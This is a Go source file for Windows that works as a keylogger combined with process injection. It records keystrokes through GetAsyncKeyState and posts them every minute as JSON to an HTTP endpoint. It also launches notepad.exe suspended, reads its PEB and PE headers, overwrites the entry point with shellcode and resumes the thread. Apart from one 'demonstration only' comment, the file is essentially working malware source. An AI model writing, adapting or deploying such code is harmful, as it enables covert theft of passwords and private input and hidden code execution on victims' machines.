//go:build !server
// +build !server

package main

import (
	"bytes"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Define the basic process information structure
type PROCESS_BASIC_INFORMATION struct {
	Reserved1    uintptr
	PebAddress   uintptr
	Reserved2    [2]uintptr
	UniquePid    uintptr
	MoreReserved uintptr
}

var (
	user32           = syscall.NewLazyDLL("user32.dll")
	getAsyncKeyState = user32.NewProc("GetAsyncKeyState")
	history          = make([]string, 0)
	mu               sync.Mutex
)

func keyToString(k int) string {
	switch k {
	case 13:
		return "[ENTER]"
	case 8:
		return "[BACKSPACE]"
	case 32:
		return " "
	}

	// Letters A-Z
	if k >= 65 && k <= 90 {
		return string(rune(k))
	}

	// Numbers (top row 0–9)
	if k >= 48 && k <= 57 {
		return string(rune(k))
	}

	// Numpad 0–9
	if k >= 96 && k <= 105 {
		return string(rune(k - 48))
	}

	return ""
}

// Function to send data
func sendHistoryToServer() {
	mu.Lock()

	// If nothing to send, skip
	if len(history) == 0 {
		mu.Unlock()
		return
	}

	// Copy current data (so we can safely clear original)
	dataToSend := make([]string, len(history))
	copy(dataToSend, history)

	mu.Unlock()

	url := "http://localhost:8080/endpoint"

	// Convert to JSON
	data, err := json.Marshal(dataToSend)
	if err != nil {
		fmt.Println("Error encoding JSON:", err)
		return
	}

	// Send request
	resp, err := http.Post(url, "application/json", bytes.NewBuffer(data))
	if err != nil {
		fmt.Println("Error sending request:", err)
		return
	}
	defer resp.Body.Close()

	// Only clear if successfully sent
	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		mu.Lock()
		history = nil // ✅ clears the slice
		mu.Unlock()

		fmt.Println("Sent and cleared history")
	} else {
		fmt.Println("Server returned status:", resp.Status)
	}
}

func main() {
	fmt.Println("Started. Press Ctrl+C to stop.")

	ticker := time.NewTicker(1 * time.Minute)
	defer ticker.Stop()

	go func() {
		for range ticker.C {
			sendHistoryToServer()
		}
	}()

	fmt.Println("Program started...")

	// 1. Define your shellcode (e.g., a simple payload)
	// Example shellcode for demonstration only
	shellcode := []byte{0x90, 0x90, 0xCC}

	// 2. Target a legitimate process path
	targetPath := "C:\\Windows\\System32\\notepad.exe"

	var si windows.StartupInfo
	var pi windows.ProcessInformation

	// 3. Create the process in a SUSPENDED state
	err := windows.CreateProcess(
		nil,
		windows.StringToUTF16Ptr(targetPath),
		nil, nil, false,
		windows.CREATE_SUSPENDED,
		nil, nil, &si, &pi,
	)
	if err != nil {
		log.Fatalf("Failed to create suspended process: %v", err)
	}

	// 4. Query the process to find the PEB (Process Environment Block)
	var pbi PROCESS_BASIC_INFORMATION
	var returnLen uint32
	windows.NtQueryInformationProcess(
		pi.Process,
		0, // ProcessBasicInformation
		unsafe.Pointer(&pbi),
		uint32(unsafe.Sizeof(pbi)),
		&returnLen,
	)

	// 5. Get the Image Base Address from the PEB (PEB + 0x10 for x64)
	imageBaseAddrPtr := pbi.PebAddress + 0x10
	addressBuffer := make([]byte, 8)
	var bytesRead uintptr
	windows.ReadProcessMemory(pi.Process, imageBaseAddrPtr, &addressBuffer[0], 8, &bytesRead)
	imageBaseAddr := binary.LittleEndian.Uint64(addressBuffer)

	// 6. Identify the Entry Point (reading headers at the base address)
	headerBuffer := make([]byte, 0x400)
	windows.ReadProcessMemory(pi.Process, uintptr(imageBaseAddr), &headerBuffer[0], 0x400, &bytesRead)

	lfanew := binary.LittleEndian.Uint32(headerBuffer[0x3C:])               // PE header offset
	entryPointRVA := binary.LittleEndian.Uint32(headerBuffer[lfanew+0x28:]) // Entry point offset
	entryPointAddr := uintptr(imageBaseAddr + uint64(entryPointRVA))

	// 7. Overwrite the entry point with your code
	var bytesWritten uintptr
	windows.WriteProcessMemory(pi.Process, entryPointAddr, &shellcode[0], uintptr(len(shellcode)), &bytesWritten)

	// 8. Resume the process to execute the new code
	windows.ResumeThread(pi.Thread)
	fmt.Printf("Code executed inside %s (PID: %d)\n", targetPath, pi.ProcessId)

	for {
		for i := 0; i < 256; i++ {
			ret, _, _ := getAsyncKeyState.Call(uintptr(i))

			// Detect NEW key press (no spam)
			if ret&1 != 0 {
				key := keyToString(i)
				if key != "" {
					history = append(history, key)
				}
			}
		}

		if len(history) > 0 {
			fmt.Printf("\rLast keys: %v", history)
		}

		time.Sleep(20 * time.Millisecond)
	}
}
